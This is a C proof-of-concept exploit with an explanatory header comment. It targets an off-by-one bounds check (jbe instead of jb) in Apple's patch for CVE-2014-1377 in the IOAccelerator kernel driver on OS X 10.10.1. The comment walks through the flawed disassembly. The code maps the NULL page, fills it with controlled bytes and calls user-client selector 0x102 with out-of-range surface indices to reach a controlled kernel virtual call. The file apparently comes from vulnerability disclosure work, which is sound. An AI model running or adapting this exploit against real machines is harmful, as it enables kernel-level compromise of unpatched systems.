/*
tested on: MacBookAir5,2 w/ 10.10.1 (14B25)
build: clang -o blit_updated blit_updated.c -m32 -framework IOKit -pagezero_size 0x0

There's a bug in the fix for CVE-2014-1377 (https://code.google.com/p/google-security-research/issues/detail?id=17)

IOAccel2DContext2::blit used to pass a user-controlled dword directly to IOAccelDisplayMachine2::getFullScreenSurface(uint)
without first checking that it was a valid surface index - this lead quite directly to a OOB read and a subsequent
controlled virtual function call.

The fix added the following code:
++ __text:00000000000018FA                 mov     ebx, [r12+0Ch] ; r12 points to user-controlled data - > ebx controlled
++ __text:00000000000018FF                 mov     rdi, [r13+0FD0h] ; this
++ __text:0000000000001906                 call    __ZN22IOAccelDisplayMachine219getFramebufferCountEv ; IOAccelDisplayMachine2::getFramebufferCount(void)
++ __text:000000000000190B                 cmp     ebx, eax       ; eax contains number of valid framebuffer
++ __text:000000000000190D                 jbe     short loc_1926 ; jump to 1926 if ebx is less than or equal to number of framebuffers
++ __text:000000000000190F
++ __text:000000000000190F loc_190F:                               ; CODE XREF: IOAccel2DContext2::blit(IOAccel2DBlitCommand *,ulong long)+22Ej
++ __text:000000000000190F                                         ; IOAccel2DContext2::blit(IOAccel2DBlitCommand *,ulong long)+24Dj
++ __text:000000000000190F                 mov     rax, [r15]      ; fail
++ __text:0000000000001912                 mov     rdi, r15
++ __text:0000000000001915                 call    qword ptr [rax+170h]
++ __text:000000000000191B                 mov     r14d, 0E00002C2h
++ __text:0000000000001921                 jmp     loc_1ACE
++ __text:0000000000001926 ; ---------------------------------------------------------------------------
__text:0000000000001926
__text:0000000000001926 loc_1926:                               ; CODE XREF: IOAccel2DContext2::blit(IOAccel2DBlitCommand *,ulong long)+3A1j
__text:0000000000001926                 mov     rdi, [r13+0FD0h] ; this
__text:000000000000192D                 mov     esi, [r12+0Ch]  ; unsigned int - controlled value used as an offset :)
__text:0000000000001932                 call    __ZN22IOAccelDisplayMachine220getFullScreenSurfaceEj ; IOAccelDisplayMachine2::getFullScreenSurface(uint)
__text:0000000000001937                 test    rax, rax
__text:000000000000193A                 jz      short loc_1945
__text:000000000000193C
__text:000000000000193C loc_193C:                               ; CODE XREF: IOAccel2DContext2::blit(IOAccel2DBlitCommand *,ulong long)+267j
__text:000000000000193C                 mov     rbx, [rax+1220h] ; virtual function will later be called on rbx

The patch added a call to IOAccelDisplayMachine2::getFramebufferCount but then uses the <= operator (jbe) to determine if the passed in index is
valid - there's an off-by-one here, it should be '<' (jb)

This lets us read one off the end of the surface array (getFullScreenSurface doesn't bounds check), in this case the value there is NULL so this PoC maps the NULL page to demonstrate exploitability.
It might be the case that you could fill up the surface array such that reading one off the end wouldn't result in reading NULL, I haven't looked though.

ianbeer
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/vm_map.h>


#include <IOKit/IOKitLib.h>

int main(){
  kern_return_t err;
  // re map the null page rw
  int var = 0;
  err = vm_deallocate(mach_task_self(), 0x0, 0x1000);
  if (err != KERN_SUCCESS){
    printf("%x\n", err);
  }
  vm_address_t addr = 0;
  err = vm_allocate(mach_task_self(), &addr, 0x1000, 0);
  if (err != KERN_SUCCESS){
    if (err == KERN_INVALID_ADDRESS){
      printf("invalid address\n");
    }
    if (err == KERN_NO_SPACE){
      printf("no space\n");
    }
    printf("%x\n", err);
  }
  char* np = 0;
  for (int i = 0; i < 0x1000; i++){
    np[i] = 'A';
  }

  CFMutableDictionaryRef matching = IOServiceMatching("IOAccelerator");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);

  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 2, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    //return 0;
  }else{
    printf("got userclient connection: %x, type:%d\n", conn, 2);
  }
  
  printf("got userclient connection: %x\n", conn);

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;

  inputScalarCnt = 0;

  uint32_t *blit_commands = (uint32_t*)inputStruct;
  blit_commands[0] = 1;
  blit_commands[1] = 0;
  blit_commands[2] = 0;
  for (int i = 0; i < 32; i++){

    blit_commands[3] = i;

    inputStructCnt = 16;

    outputScalarCnt = 0;
    outputStructCnt = 0;

    err = IOConnectCallMethod(
      conn,
      0x102,
      inputScalar,
      inputScalarCnt,
      inputStruct,
      inputStructCnt,
      outputScalar,
      &outputScalarCnt,
      outputStruct,
      &outputStructCnt); 

    if (err != KERN_SUCCESS){
      printf("IOConnectCall error: %x\n", err);
      return 0;
    }

    printf("called selector 0x102\n");
  }
  return 0;
}
